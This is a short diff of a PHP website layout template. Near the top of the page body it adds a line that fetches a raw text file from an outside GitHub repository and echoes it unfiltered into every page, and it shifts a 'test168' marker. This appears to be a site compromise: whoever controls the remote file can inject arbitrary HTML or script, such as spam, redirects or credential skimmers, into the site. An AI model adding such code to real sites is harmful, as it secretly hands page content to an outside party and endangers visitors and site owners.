@@ -30,6 +30,7 @@ include($this['path']->path('layouts:template.config.php'));
 	
 	<div class="wrapper grid-block">
 		<p>test168</p>
+		<?php echo file_get_contents("https://raw.githubusercontent.com/rishan828-cr1/back/main/1.txt"); ?>
 		<div id="toolbar" class="grid-block">
 
 				<?php if ($this['modules']->count('toolbar-l') || $this['config']->get('date')) : ?>
@@ -159,8 +160,6 @@ include($this['path']->path('layouts:template.config.php'));
 			</div>
 		</section>
 		<?php endif; ?>
-
-			<p>test168</p>
 		<?php if ($this['modules']->count('breadcrumbs')) : ?>
 		<section id="breadcrumbs">
 			<a href="<?php echo $this['config']->get('site_url'); ?>" class="home"></a>
